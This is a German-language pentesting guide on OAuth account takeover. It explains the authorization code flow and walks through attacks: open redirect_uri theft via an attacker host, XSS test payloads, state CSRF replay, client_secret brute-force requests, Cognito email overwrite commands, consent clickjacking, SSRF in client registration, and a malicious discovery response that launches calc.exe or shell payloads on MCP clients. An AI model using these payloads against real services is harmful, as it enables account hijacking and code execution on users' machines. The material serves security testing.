# OAuth zur Kontoübernahme

{{#include ../banners/hacktricks-training.md}}

## Grundlegende Informationen <a href="#d4a8" id="d4a8"></a>

OAuth bietet verschiedene Versionen; grundlegende Informationen sind verfügbar unter [OAuth 2.0 documentation](https://oauth.net/2/). Diese Diskussion konzentriert sich hauptsächlich auf den weit verbreiteten [OAuth 2.0 authorization code grant type](https://oauth.net/2/grant-types/authorization-code/), der ein **Autorisierungs-Framework bietet, das einer Anwendung ermöglicht, auf das Konto eines Benutzers in einer anderen Anwendung zuzugreifen oder Aktionen darin auszuführen** (der Autorisierungsserver).

Betrachten wir eine hypothetische Website _**https://example.com**_, die dazu gedacht ist, **all deine Social-Media-Posts anzuzeigen**, einschließlich privater. Um dies zu erreichen, wird OAuth 2.0 eingesetzt. _https://example.com_ wird deine Erlaubnis anfordern, **auf deine Social-Media-Posts zuzugreifen**. Infolgedessen erscheint auf _https://socialmedia.com_ ein Consent-Screen, der die **angeforderten Berechtigungen und den anfragenden Entwickler** aufzeigt. Nach deiner Autorisierung erhält _https://example.com_ die Möglichkeit, **in deinem Namen auf deine Posts zuzugreifen**.

Es ist wichtig, die folgenden Komponenten im OAuth 2.0-Framework zu verstehen:

- **resource owner**: Du, als **Benutzer/Entität**, autorisierst den Zugriff auf deine Ressource, z. B. die Posts deines Social-Media-Kontos.
- **resource server**: Der **Server, der authentifizierte Anfragen verwaltet**, nachdem die Anwendung ein `access token` im Namen des `resource owner` erhalten hat, z. B. **https://socialmedia.com**.
- **client application**: Die **Anwendung, die Autorisierung vom `resource owner` anfordert**, wie z. B. **https://example.com**.
- **authorization server**: Der **Server, der `access tokens` ausstellt** an die `client application` nach erfolgreicher Authentifizierung des `resource owner` und Einholung der Autorisierung, z. B. **https://socialmedia.com**.
- **client_id**: Eine öffentliche, eindeutige Kennung für die Anwendung.
- **client_secret:** Ein vertraulicher Schlüssel, der nur der Anwendung und dem Autorisierungsserver bekannt ist und zur Erzeugung von `access_tokens` verwendet wird.
- **response_type**: Ein Wert, der **die Art des angeforderten Tokens** angibt, z. B. `code`.
- **scope**: Der **Zugriffsumfang**, den die `client application` vom `resource owner` anfordert.
- **redirect_uri**: Die **URL, zu der der Benutzer nach der Autorisierung weitergeleitet wird**. Diese muss typischerweise mit der vorregistrierten Redirect-URL übereinstimmen.
- **state**: Ein Parameter zur **Aufrechterhaltung von Daten während der Weiterleitung des Benutzers zum und vom Autorisierungsserver**. Seine Einzigartigkeit ist kritisch, da er als **CSRF-Schutzmechanismus** dient.
- **grant_type**: Ein Parameter, der **den Grant-Typ und die Art des zurückzugebenden Tokens** angibt.
- **code**: Der Autorisierungscode vom `authorization server`, der zusammen mit `client_id` und `client_secret` von der client application verwendet wird, um ein `access_token` zu erhalten.
- **access_token**: Der **Token, den die client application für API-Anfragen** im Namen des `resource owner` verwendet.
- **refresh_token**: Ermöglicht der Anwendung, ein neues `access_token` zu erhalten, ohne den Benutzer erneut um Erlaubnis zu bitten.

### Ablauf

Der **eigentliche OAuth-Ablauf** verläuft wie folgt:

1. Du rufst [https://example.com](https://example.com) auf und klickst auf die Schaltfläche „Integrate with Social Media“.
2. Die Seite sendet dann eine Anfrage an [https://socialmedia.com](https://socialmedia.com), um deine Autorisierung zu ersuchen, damit die Anwendung von https://example.com auf deine Posts zugreifen darf. Die Anfrage ist wie folgt strukturiert:
```
https://socialmedia.com/auth
?response_type=code
&client_id=example_clientId
&redirect_uri=https%3A%2F%2Fexample.com%2Fcallback
&scope=readPosts
&state=randomString123
```
3. Anschließend wird Ihnen eine Zustimmungsseite angezeigt.
4. Nach Ihrer Zustimmung sendet Social Media eine Antwort an die `redirect_uri` mit den Parametern `code` und `state`:
```
https://example.com?code=uniqueCode123&state=randomString123
```
5. https://example.com verwendet diesen `code` zusammen mit seinem `client_id` und `client_secret`, um serverseitig ein `access_token` in Ihrem Namen anzufordern, wodurch Zugriff auf die Berechtigungen ermöglicht wird, denen Sie zugestimmt haben:
```
POST /oauth/access_token
Host: socialmedia.com
...{"client_id": "example_clientId", "client_secret": "example_clientSecret", "code": "uniqueCode123", "grant_type": "authorization_code"}
```
6. Finally, the process concludes as https://example.com employs your `access_token` to make an API call to Social Media to access

## Schwachstellen <a href="#id-323a" id="id-323a"></a>

### Open redirect_uri <a href="#cc36" id="cc36"></a>

Per [RFC 6749 §3.1.2](https://www.rfc-editor.org/rfc/rfc6749#section-3.1.2), der authorization server muss den Browser nur zu **pre-registered, exact redirect URIs** weiterleiten. Jede Schwäche hier erlaubt es einem Angreifer, ein Opfer über eine bösartige authorization URL zu schicken, sodass der IdP den `code` (und `state`) des Opfers direkt an einen Angreifer-Endpunkt liefert, der ihn dann einlösen und Tokens ernten kann.

Typischer Ablauf eines Angriffs:

1. Craft `https://idp.example/auth?...&redirect_uri=https://attacker.tld/callback` und sende es an das Opfer.
2. Das Opfer authentifiziert sich und genehmigt die scopes.
3. Der IdP leitet auf `attacker.tld/callback?code=<victim-code>&state=...` weiter, wo der Angreifer die Anfrage protokolliert und den code sofort einlöst.

Häufige Validierungsfehler, die geprüft werden sollten:

- **No validation** – jede absolute URL wird akzeptiert, was zu instant code theft führt.
- **Weak substring/regex checks on the host** – Umgehbar mit Lookalikes wie `evilmatch.com`, `match.com.evil.com`, `match.com.mx`, `matchAmatch.com`, `evil.com#match.com` oder `match.com@evil.com`.
- **IDN homograph mismatches** – die Validierung erfolgt in der punycode-Form (`xn--`), aber der Browser redirectet zur Unicode-Domain, die vom Angreifer kontrolliert wird.
- **Arbitrary paths on an allowed host** – das Setzen von `redirect_uri` auf `/openredirect?next=https://attacker.tld` oder jeden XSS-/User-Content-Endpunkt leakst den code entweder durch chained redirects, Referer headers oder injizierte JavaScript.
- **Directory constraints without normalization** – Muster wie `/oauth/*` können mit `/oauth/../anything` umgangen werden.
- **Wildcard subdomains** – das Akzeptieren von `*.example.com` bedeutet, dass jede Übernahme (dangling DNS, S3 bucket, etc.) sofort einen gültigen Callback ergibt.
- **Non-HTTPS callbacks** – das Durchlassen von `http://` URIs gibt Netzwerkangreifern (Wi-Fi, corporate proxy) die Möglichkeit, den code in transit abzufangen.

Überprüfe auch auxiliary redirect-style parameters (`client_uri`, `policy_uri`, `tos_uri`, `initiate_login_uri`, etc.) und das OpenID discovery document (`/.well-known/openid-configuration`) auf zusätzliche Endpunkte, die dieselben Validierungsfehler erben könnten.

### XSS in redirect implementation <a href="#bda5" id="bda5"></a>

Wie in diesem bug bounty report [https://blog.dixitaditya.com/2021/11/19/account-takeover-chain.html](https://blog.dixitaditya.com/2021/11/19/account-takeover-chain.html) erwähnt, kann es möglich sein, dass die redirect **URL in der Antwort** des Servers nach der Authentifizierung des Nutzers reflektiert wird und dadurch **vulnerable to XSS** ist. Mögliche Payload zum Testen:
```
https://app.victim.com/login?redirectUrl=https://app.victim.com/dashboard</script><h1>test</h1>
```
### CSRF - Unsachgemäße Handhabung des state-Parameters <a href="#bda5" id="bda5"></a>

Der `state`-Parameter ist das Authorization Code flow CSRF-Token: der Client muss einen kryptographisch zufälligen Wert pro Browser-Instanz erzeugen, ihn an einem Ort speichern, den nur dieser Browser lesen kann (Cookie, local storage, etc.), ihn in die Authorization-Anfrage senden und jede Antwort ablehnen, die nicht denselben Wert zurückgibt. Sobald der Wert statisch, vorhersagbar, optional oder nicht an die Sitzung des Benutzers gebunden ist, kann ein Angreifer seinen eigenen OAuth-Flow abschließen, die finale `?code=`-Anfrage abfangen (ohne sie abzusenden) und später den Browser eines Opfers dazu zwingen, diese Anfrage zu replayen, sodass das Opferkonto mit dem Profil des Angreifers beim Identity Provider verknüpft wird.

Das Replay-Muster ist immer dasselbe:

1. Der Angreifer authentifiziert sich beim IdP mit seinem Account und fängt den letzten Redirect ab, der `code` (und ggf. `state`) enthält.
2. Er verwirft diese Anfrage, behält die URL und missbraucht später irgendeinen CSRF-Primitive (Link, iframe, auto-submitting form), um den Browser des Opfers zu zwingen, sie zu laden.
3. Wenn der Client `state` nicht durchsetzt, verarbeitet die Anwendung das Autorisierungsergebnis des Angreifers und loggt den Angreifer in das Konto des Opfers ein.

Praktische Checkliste für den Umgang mit `state` während Tests:

- **Fehlender `state` vollständig** – wenn der Parameter nie auftaucht, ist der gesamte Login CSRF-anfällig.
- **`state` nicht erforderlich** – entferne ihn aus der initialen Anfrage; wenn der IdP trotzdem Codes ausstellt, die der Client akzeptiert, ist die Defense opt-in.
- **Zurückgeliefertes `state` nicht validiert** – manipuliere den Wert in der Antwort (Burp, MITM proxy). Akzeptieren von nicht übereinstimmenden Werten bedeutet, dass der gespeicherte Token nie verglichen wird.
- **Vorhersagbarer oder rein datengetriebener `state`** – viele Apps stopfen Redirect-Pfade oder JSON-Blobs in `state`, ohne Zufälligkeit zu mischen, was es Angreifern erlaubt, gültige Werte zu erraten und Flows zu replayen. Füge immer starke Entropie vor dem Kodieren der Daten hinzu (prepend/append).
- **`state`-Fixierung** – wenn die App es Nutzern erlaubt, den `state`-Wert zu liefern (z. B. via crafted authorization URLs) und diesen während des Flows wiederverwendet, kann ein Angreifer einen bekannten Wert festsetzen und ihn gegen mehrere Opfer wiederverwenden.

PKCE kann `state` ergänzen (insbesondere für public clients), indem der Authorization Code an einen code verifier gebunden wird, aber Web-Clients müssen `state` weiterhin verfolgen, um Cross-User CSRF/Account-Linking-Bugs zu verhindern.

### Vor einer Account-Übernahme <a href="#ebe4" id="ebe4"></a>

1. **Ohne E-Mail-Verifikation bei der Kontoerstellung**: Angreifer können vorsorglich ein Konto mit der E-Mail des Opfers anlegen. Wenn das Opfer später einen Third-Party-Service zum Login verwendet, könnte die Anwendung dieses Third-Party-Konto versehentlich mit dem vom Angreifer vorab erstellten Konto verknüpfen, was zu unautorisiertem Zugriff führt.
2. **Ausnutzen laxen OAuth E-Mail-Checks**: Angreifer können OAuth-Services ausnutzen, die E-Mails nicht verifizieren, indem sie sich registrieren und dann die Account-E-Mail auf die des Opfers ändern. Diese Methode führt ähnlich wie das erste Szenario zu einem Risiko unautorisierten Zugriffs, jedoch über einen anderen Angriffsvektor.

### Offenlegung von Geheimnissen <a href="#e177" id="e177"></a>

Der `client_id` ist absichtlich öffentlich, aber das **`client_secret` darf niemals für Endnutzer wiederherstellbar sein**. Authorization Code-Deployments, die das Secret in **mobile APKs, desktop clients, or single-page apps** einbetten, geben diese Anmeldeinformationen effektiv an jeden weiter, der das Paket herunterladen kann. Untersuche public clients immer durch:

- Entpacken der APK/IPA, des Desktop-Installers oder der Electron-App und grepping nach `client_secret`, Base64-Blobs, die zu JSON decodieren, oder nach hartkodierten OAuth-Endpunkten.
- Überprüfen gebündelter Konfigurationsdateien (plist, JSON, XML) oder dekompilierter Strings auf Client-Credentials.

Sobald der Angreifer das Secret extrahiert hat, muss er nur noch einen beliebigen Autorisierungs-`code` des Opfers stehlen (via schwachem `redirect_uri`, Logs, etc.), um unabhängig `/token` anzusprechen und access/refresh tokens zu minten, ohne die legitime App zu involvieren. Behandle public/native clients als **nicht in der Lage, Geheimnisse zu halten** — sie sollten stattdessen auf PKCE (RFC 7636) setzen, um den Besitz eines pro-Instanz code verifier zu beweisen statt eines statischen Secrets. Bestätige während Tests, ob PKCE verpflichtend ist und ob das Backend Token-Exchanges tatsächlich ablehnt, die weder das `client_secret` **noch** einen gültigen `code_verifier` enthalten.

### Client Secret Bruteforce

Du kannst versuchen, das **client_secret zu bruteforcen** eines Service-Providers beim Identity Provider, um zu versuchen, Konten zu stehlen.  
Die Anfrage zum BF könnte ähnlich aussehen:
```
POST /token HTTP/1.1
content-type: application/x-www-form-urlencoded
host: 10.10.10.10:3000
content-length: 135
Connection: close

code=77515&redirect_uri=http%3A%2F%2F10.10.10.10%3A3000%2Fcallback&grant_type=authorization_code&client_id=public_client_id&client_secret=[bruteforce]
```
### Referer Header leaking Code + State

Sobald der Client den **code and state** hat, ist er verwundbar, wenn diese beim Wechsel zu einer anderen Seite **im Referer header** reflektiert werden.

### Access Token im Browser-Verlauf

Das zentrale Versprechen des Authorization Code grants ist, dass **access tokens niemals im Browser des Resource Owners ankommen**. Wenn Implementierungen Tokens client-seitig leak'en, wird jeder kleine Bug (XSS, Referer leak, Proxy-Logging) zur sofortigen Kontoübernahme. Prüfe immer:

- **Tokens in URLs** – wenn `access_token` im Query/Fragment auftaucht, landet er im Browser-Verlauf, in Server-Logs, Analytics und in Referer-Headern, die an Dritte gesendet werden.
- **Tokens, die durch untrusted middleboxes laufen** – Tokens über HTTP zurückzugeben oder durch Debugging-/Corporate-Proxies zu leiten erlaubt Netzwerkbeobachtern, sie direkt zu erfassen.
- **Tokens in JavaScript-State** – React/Vue-Stores, globale Variablen oder serialisierte JSON-Blobs offenbaren Tokens für jedes Script auf der Origin (inkl. XSS-Payloads oder bösartige Extensions).
- **Tokens in Web Storage** – `localStorage`/`sessionStorage` behalten Tokens lange nach dem Logout auf geteilten Geräten und sind per Script zugreifbar.

Einer dieser Befunde hebt normalerweise sonst “low” Bugs (wie einen CSP bypass oder DOM XSS) zu einer vollständigen API-Übernahme, weil der Angreifer den leaked bearer token einfach auslesen und wiederverwenden kann.

### Ewiger Authorization Code

Authorization codes müssen **kurzlebig, Single-Use und replay-aware** sein. Beim Prüfen eines Flows fange einen `code` ab und:

- **Test der Lebensdauer** – RFC 6749 empfiehlt Minuten, nicht Stunden. Versuche, den Code nach 5–10 Minuten einzulösen; wenn er noch funktioniert, ist das Exposure-Fenster für jeden leaked code zu groß.
- **Test der sequentiellen Wiederverwendung** – sende denselben `code` zweimal. Gibt die zweite Anfrage wieder ein Token zurück, können Angreifer Sessions unbegrenzt klonen.
- **Test gleichzeitiger Einlösungen / Race Conditions** – schicke zwei Token-Requests parallel (Burp intruder, turbo intruder). Schwache Issuer gewähren manchmal beide.
- **Beobachte Replay-Handling** – ein Wiederverwendungsversuch sollte nicht nur fehlschlagen, sondern auch bereits aus diesem Code ausgestellte Tokens widerrufen. Andernfalls bleibt bei erkanntem Replay das erste Token des Angreifers aktiv.

Die Kombination eines replay-freundlichen Codes mit beliebigem `redirect_uri`- oder Logging-Bug ermöglicht persistierenden Konto-Zugriff, selbst nachdem das Opfer den legitimen Login abgeschlossen hat.

### Authorization/Refresh Token nicht an den Client gebunden

Wenn du den **authorization code** bekommst und ihn mit einem anderen Client verwenden kannst, dann kannst du andere Accounts takeover.

### Happy Paths, XSS, Iframes & Post Messages to leak code & state values

[**Sieh dir diesen Beitrag an**](https://labs.detectify.com/writeups/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/#gadget-2-xss-on-sandbox-third-party-domain-that-gets-the-url)

### AWS Cognito <a href="#bda5" id="bda5"></a>

In diesem bug bounty Report: [**https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/**](https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/) sieht man, dass der **token**, den **AWS Cognito** an den Benutzer zurückgibt, möglicherweise **genügend Berechtigungen besitzt, um Benutzerdaten zu überschreiben**. Wenn du also die **user email** für eine andere user email ändern kannst, könntest du möglicherweise andere Accounts übernehmen.
```bash
# Read info of the user
aws cognito-idp get-user --region us-east-1 --access-token eyJraWQiOiJPVj[...]

# Change email address
aws cognito-idp update-user-attributes --region us-east-1 --access-token eyJraWQ[...] --user-attributes Name=email,Value=imaginary@flickr.com
{
"CodeDeliveryDetailsList": [
{
"Destination": "i***@f***.com",
"DeliveryMedium": "EMAIL",
"AttributeName": "email"
}
]
}
```
Für detailliertere Informationen darüber, wie man AWS Cognito missbraucht, siehe [AWS Cognito - Unauthenticated Enum Access](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-unauthenticated-enum-access/aws-cognito-unauthenticated-enum.html).

### Missbrauch von Tokens anderer Apps <a href="#bda5" id="bda5"></a>

Wie in [**diesem writeup**](https://salt.security/blog/oh-auth-abusing-oauth-to-take-over-millions-of-accounts) erwähnt, können OAuth-Flows, die erwarten, ein **token** (und nicht einen code) zu erhalten, verwundbar sein, wenn sie nicht prüfen, dass das token zur App gehört.

Dies liegt daran, dass ein **attacker** eine **application supporting OAuth and login with Facebook** (zum Beispiel) in seiner eigenen Anwendung erstellen könnte. Sobald ein **victim** sich mit Facebook in der **attackers application** einloggt, könnte der **attacker** das **OAuth token** des Users, das seiner Anwendung gegeben wurde, erhalten und es verwenden, um sich in der OAuth-Anwendung des **victim** mit dem user token des **victim** einzuloggen.

> [!CAUTION]
> Wenn der **attacker** es schafft, den **user** dazu zu bringen, auf seine eigene OAuth-Anwendung zuzugreifen, kann er die Accounts der **victim** in Anwendungen übernehmen, die ein token erwarten und nicht prüfen, ob das token ihrer app ID gewährt wurde.

### Two links & cookie <a href="#bda5" id="bda5"></a>

Laut [**diesem writeup**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f) war es möglich, ein **victim** dazu zu bringen, eine Seite mit einem **returnUrl** zu öffnen, die auf den Host des **attacker** zeigt. Diese Information würde in einem Cookie (**RU**) gespeichert und in einem **späteren Schritt** würde das **prompt** den **user** fragen, ob er dem Host des **attacker** Zugriff gewähren möchte.

Um dieses prompt zu umgehen, war es möglich, einen Tab zu öffnen, um den **Oauth flow** zu starten, der dieses RU-Cookie mittels **returnUrl** setzt, den Tab zu schließen bevor das prompt angezeigt wird und einen neuen Tab ohne diesen Wert zu öffnen. Dann informiert das **prompt** nicht über den Host des **attacker**, aber das Cookie wäre auf ihn gesetzt, sodass das **token** bei der Redirect an den Host des **attacker** gesendet wird.

### Prompt Interaction Bypass <a href="#bda5" id="bda5"></a>

Wie in [**diesem video**](https://www.youtube.com/watch?v=n9x7_J_a_7Q) erläutert, erlauben einige OAuth-Implementierungen, den GET-Parameter **`prompt`** auf None (**`&prompt=none`**) zu setzen, um zu verhindern, dass Nutzer per prompt um Bestätigung der Zugriffsrechte gebeten werden, falls sie bereits auf der Plattform eingeloggt sind.

### response_mode

Wie [**in diesem video**](https://www.youtube.com/watch?v=n9x7_J_a_7Q) erklärt, kann man möglicherweise den Parameter **`response_mode`** angeben, um zu steuern, wo der code im finalen URL bereitgestellt wird:

- `response_mode=query` -> Der code wird in einem GET-Parameter bereitgestellt: `?code=2397rf3gu93f`
- `response_mode=fragment` -> Der code wird im URL-Fragment bereitgestellt: `#code=2397rf3gu93f`
- `response_mode=form_post` -> Der code wird in einem POST-Formular mit einem input namens `code` und dem Wert bereitgestellt
- `response_mode=web_message` -> Der code wird in einer postMessage gesendet: `window.opener.postMessage({"code": "asdasdasd...`

### Clickjacking OAuth consent dialogs

OAuth consent/login dialogs sind ideale Clickjacking-Ziele: Wenn sie gerahmt werden können, kann ein Angreifer eigene Grafiken überlagern, die echten Buttons verbergen und Nutzer dazu verleiten, gefährliche scopes zu genehmigen oder Accounts zu verknüpfen. Baue PoCs, die:

1. Die IdP authorization URL in ein `<iframe sandbox="allow-forms allow-scripts allow-same-origin">` laden.
2. Absolute Positionierungs-/Opacity-Tricks verwenden, um gefälschte Buttons mit den versteckten **Allow**/**Approve**-Kontrollen auszurichten.
3. Optional Parameter (scopes, redirect URI) vorausfüllen, sodass die gestohlene Zustimmung dem attacker sofort zugutekommt.

Während der Tests prüfen, ob IdP-Seiten entweder `X-Frame-Options: DENY/SAMEORIGIN` oder eine restriktive `Content-Security-Policy: frame-ancestors 'none'` ausgeben. Wenn keines vorhanden ist, demonstriere das Risiko mit Tools wie [NCC Group’s clickjacking PoC generator](https://github.com/nccgroup/clickjacking-poc) und dokumentiere, wie leicht ein victim die App des attacker autorisiert. Für zusätzliche Payload-Ideen siehe [Clickjacking](clickjacking.md).

### OAuth ROPC flow - 2 FA bypass <a href="#b440" id="b440"></a>

Laut [**diesem blog post**](https://cybxis.medium.com/a-bypass-on-gitlabs-login-email-verification-via-oauth-ropc-flow-e194242cad96) ist dies ein OAuth-Flow, der erlaubt, sich via **username** und **password** bei OAuth einzuloggen. Wenn in diesem einfachen Flow ein **token** zurückgegeben wird, das Zugriff auf alle Aktionen des Users gewährt, ist es möglich, 2FA mit diesem token zu umgehen.

### ATO on web page redirecting based on open redirect to referrer <a href="#bda5" id="bda5"></a>

Dieser [**blogpost**](https://blog.voorivex.team/oauth-non-happy-path-to-ato) beschreibt, wie man ein **open redirect** auf den Wert des **referrer** missbrauchen konnte, um OAuth zu ATO zu missbrauchen. Der Angriff war:

1. Das **victim** besucht die Webseite des **attacker**.
2. Das **victim** öffnet den bösartigen Link und ein opener startet den Google OAuth-Flow mit `response_type=id_token,code&prompt=none` als zusätzliche Parameter, wobei als **referrer die Website des attacker** verwendet wird.
3. Im opener, nachdem der Provider das victim authorisiert hat, sendet er sie zurück zum Wert des `redirect_uri`-Parameters (victim-Web) mit einem 30X-Redirect, das die Website des attacker weiterhin im referer behält.
4. Die victim-Website löst das open redirect basierend auf dem referrer aus und leitet den victim zur Website des attacker weiter. Da der **`response_type`** **`id_token,code`** war, wird der code im URL-Fragment an den attacker gesendet, was ihm erlaubt, das Konto des Users über Google auf der victim-Seite zu übernehmen.

### SSRFs parameters <a href="#bda5" id="bda5"></a>

[**Check this research**](https://portswigger.net/research/hidden-oauth-attack-vectors) für weitere Details zu dieser Technik.

Dynamic Client Registration in OAuth ist ein weniger offensichtlicher, aber kritischer Vektor für Sicherheitslücken, speziell für **SSRF**-Angriffe. Dieser Endpoint erlaubt OAuth-Servern, Details über Client-Applikationen zu erhalten, einschließlich sensibler URLs, die ausgenutzt werden können.

Wichtige Punkte:

- **Dynamic Client Registration** ist oft unter `/register` zu finden und akzeptiert Details wie `client_name`, `client_secret`, `redirect_uris` und URLs für logos oder JSON Web Key Sets (JWKs) via POST-Requests.
- Dieses Feature hält sich an die Spezifikationen in **RFC7591** und **OpenID Connect Registration 1.0**, welche Parameter enthalten, die potenziell für SSRF anfällig sind.
- Der Registrierungsprozess kann Server unabsichtlich auf verschiedene Weise für SSRF öffnen:
  - **`logo_uri`**: Eine URL für das Logo der Client-Anwendung, die der Server möglicherweise abruft und damit SSRF auslösen oder zu XSS führen kann, wenn die URL falsch gehandhabt wird.
  - **`jwks_uri`**: Eine URL zum JWK-Dokument des Clients, die, wenn bösartig gestaltet, den Server dazu bringen kann, ausgehende Requests an einen vom Angreifer kontrollierten Server zu senden.
  - **`sector_identifier_uri`**: Verweist auf ein JSON-Array von `redirect_uris`, das der Server möglicherweise abruft und damit eine SSRF-Gelegenheit schafft.
  - **`request_uris`**: Listet erlaubte request URIs für den Client auf, die ausgenutzt werden können, wenn der Server diese URIs beim Start des Authorization-Prozesses abruft.

Exploitation Strategy:

- SSRF kann ausgelöst werden, indem ein neuer Client mit bösartigen URLs in Parametern wie `logo_uri`, `jwks_uri` oder `sector_identifier_uri` registriert wird.
- Während direkte Ausnutzung via `request_uris` durch Whitelist-Kontrollen gemildert sein kann, kann das Bereitstellen einer vorregistrierten, attacker-kontrollierten `request_uri` SSRF während der Authorization-Phase erleichtern.

### OAuth/OIDC Discovery URL Abuse & OS Command Execution

Untersuchungen zu [CVE-2025-6514](https://amlalabs.com/blog/oauth-cve-2025-6514/) (betreffend `mcp-remote` Clients wie Claude Desktop, Cursor oder Windsurf) zeigen, wie **dynamische OAuth-Discovery zu einer RCE-Primitive** werden kann, wenn der Client IdP-Metadaten direkt an das Betriebssystem weiterreicht. Der entfernte MCP-Server liefert während des Discovery-Austauschs (`/.well-known/openid-configuration` oder irgendein Metadaten-RPC) einen vom Angreifer kontrollierten `authorization_endpoint`. `mcp-remote ≤0.1.15` würde dann den system URL handler (`start`, `open`, `xdg-open`, etc.) mit dem gelieferten String aufrufen, sodass jedes vom OS unterstützte scheme/path lokal ausgeführt wird.

Attack workflow

1. Weist den Desktop-Agenten auf einen feindlichen MCP/OAuth-Server (`npx mcp-remote https://evil`). Der Agent erhält `401` plus Metadaten.
2. Der Server antwortet mit JSON wie zum Beispiel:
```
HTTP/1.1 200 OK
Content-Type: application/json

{
"authorization_endpoint": "file:/c:/windows/system32/calc.exe",
"token_endpoint": "https://evil/idp/token",
...
}
```
3. Der Client startet den OS-Handler für die übergebene URI. Windows akzeptiert Payloads wie `file:/c:/windows/system32/calc.exe /c"powershell -enc ..."`; macOS/Linux akzeptieren `file:///Applications/Calculator.app/...` oder sogar benutzerdefinierte Schemes wie `cmd://bash -lc '<payload>'`, falls registriert.
4. Da dies vor jeglicher Nutzerinteraktion geschieht, **allein das Konfigurieren des Clients, damit er mit dem Angreifer-Server spricht, führt zur Code-Ausführung**.

**Wie testen**

- Ziele auf beliebige OAuth-fähige Desktop-/Agent-Anwendungen, die Discovery über HTTP(S) durchführen und zurückgegebene Endpunkte lokal öffnen (Electron apps, CLI helpers, thick clients).
- Abfange oder hoste die Discovery-Antwort und ersetze `authorization_endpoint`, `device_authorization_endpoint` oder ähnliche Felder durch `file://`, `cmd://`, UNC-Pfade oder andere gefährliche Schemes.
- Beobachte, ob der Client das scheme/host validiert. Fehlt die Validierung, führt das zur sofortigen Ausführung im Benutzerkontext und beweist die Schwachstelle.
- Wiederhole mit verschiedenen Schemes, um die gesamte Angriffsfläche zu kartieren (z. B. `ms-excel:`, `data:text/html,`, custom protocol handlers) und die plattformübergreifende Reichweite zu demonstrieren.

## OAuth providers Race Conditions

Wenn die Plattform, die du testest, ein OAuth provider ist [**read this to test for possible Race Conditions**](race-condition.md).

## Mutable Claims Attack

In OAuth identifiziert das Feld sub einen Benutzer eindeutig, aber sein Format variiert je nach Authorization Server. Um die Benutzeridentifikation zu standardisieren, verwenden einige Clients Emails oder User-Handles. Das ist jedoch riskant, weil:

- Einige Authorization Server stellen nicht sicher, dass diese Eigenschaften (wie email) unveränderlich bleiben.
- In bestimmten Implementierungen — wie **"Login with Microsoft"** — verlässt sich der Client auf das email-Feld, das **vom Benutzer in Entra ID kontrolliert** wird und nicht verifiziert ist.
- Ein Angreifer kann dies ausnutzen, indem er eine eigene Azure AD-Organisation erstellt (z. B. doyensectestorg) und diese für einen Microsoft-Login verwendet.
- Auch wenn die Object ID (gespeichert in sub) unveränderlich und sicher ist, kann die Abhängigkeit von einem veränderlichen email-Feld eine Account Takeover ermöglichen (z. B. das Kapern eines Accounts wie victim@gmail.com).

## Client Confusion Attack

Bei einer **Client Confusion Attack** verifiziert eine Anwendung, die den OAuth Implicit Flow verwendet, nicht, dass das endgültige access token speziell für ihre eigene Client ID erzeugt wurde. Ein Angreifer richtet eine öffentliche Website ein, die Google’s OAuth Implicit Flow nutzt, verleitet Tausende von Nutzern zur Anmeldung und sammelt so access tokens, die für die Site des Angreifers bestimmt sind. Haben diese Nutzer außerdem Accounts auf einer anderen verwundbaren Website, die die Client ID des Tokens nicht validiert, kann der Angreifer die gesammelten Tokens wiederverwenden, um die Opfer zu impersonifizieren und deren Accounts zu übernehmen.

## Scope Upgrade Attack

Der Typ **Authorization Code Grant** beinhaltet eine sichere Server-zu-Server-Kommunikation zum Übertragen von Benutzerdaten. Wenn jedoch der **Authorization Server** einem scope-Parameter in der Access Token Request implizit vertraut (ein Parameter, der nicht im RFC definiert ist), könnte eine bösartige Anwendung die Privilegien eines Authorization Codes erhöhen, indem sie einen höheren scope anfragt. Nachdem das **Access Token** erzeugt wurde, muss der **Resource Server** es verifizieren: Bei JWT-Tokens bedeutet das, die JWT-Signatur zu prüfen und Daten wie client_id und scope zu extrahieren; bei zufälligen String-Tokens muss der Server den Authorization Server abfragen, um die Token-Details zu erhalten.

## Redirect Scheme Hijacking

In mobilen OAuth-Implementierungen verwenden Apps **custom URI schemes**, um Redirects mit Authorization Codes zu empfangen. Da jedoch mehrere Apps dasselbe Scheme auf einem Gerät registrieren können, ist die Annahme, dass nur der legitime Client die redirect URI kontrolliert, nichtig. Auf Android wird zum Beispiel eine Intent-URI wie `com.example.app://` oauth anhand des Schemes und optionaler Filter im app’s intent-filter erfasst. Da Android’s intent resolution sehr breit sein kann — insbesondere wenn nur das Scheme angegeben ist — kann ein Angreifer eine bösartige App mit einem sorgfältig konfigurierten intent filter registrieren, um den Authorization Code zu kapern. Das kann ein **Account Takeover** ermöglichen, entweder durch Nutzerinteraktion (wenn mehrere Apps für das Handling des Intents infrage kommen) oder durch Bypass-Techniken, die zu spezifische Filter ausnutzen, wie im Assessment-Flowchart von Ostorlab beschrieben.

## Referenzen

- [**https://medium.com/a-bugz-life/the-wondeful-world-of-oauth-bug-bounty-edition-af3073b354c1**](https://medium.com/a-bugz-life/the-wondeful-world-of-oauth-bug-bounty-edition-af3073b354c1)
- [**https://portswigger.net/research/hidden-oauth-attack-vectors**](https://portswigger.net/research/hidden-oauth-attack-vectors)
- [**https://blog.doyensec.com/2025/01/30/oauth-common-vulnerabilities.html**](https://blog.doyensec.com/2025/01/30/oauth-common-vulnerabilities.html)
- [An Offensive Guide to the OAuth 2.0 Authorization Code Grant](https://www.nccgroup.com/research-blog/an-offensive-guide-to-the-authorization-code-grant/)
- [OAuth Discovery as an RCE Vector (Amla Labs)](https://amlalabs.com/blog/oauth-cve-2025-6514/)

{{#include ../banners/hacktricks-training.md}}
